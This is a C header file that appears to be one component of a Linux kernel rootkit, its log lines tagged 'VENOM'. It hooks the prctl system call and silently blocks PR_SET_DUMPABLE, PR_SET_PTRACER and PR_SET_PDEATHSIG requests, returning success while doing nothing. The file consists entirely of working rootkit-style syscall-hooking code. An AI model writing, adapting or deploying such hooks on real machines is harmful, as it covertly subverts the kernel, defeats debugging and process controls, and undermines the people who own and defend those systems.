#ifndef PRCTL_HACK_H
#define PRCTL_HACK_H

#include "../include/headers.h"


static asmlinkage long (*orig_prctl)(const struct pt_regs *regs);

static asmlinkage long hooked_prctl(const struct pt_regs *regs) {
    int option = (int)regs->di;
    
    if (option == PR_SET_DUMPABLE || 
        option == PR_SET_PTRACER ||
        option == PR_SET_PDEATHSIG) {
        TLOG_WARN("[VENOM] Blocked prctl attempt: option=%d from PID %d", option, current->pid);
        return 0;
    }
    
    return orig_prctl(regs);
}

#endif 
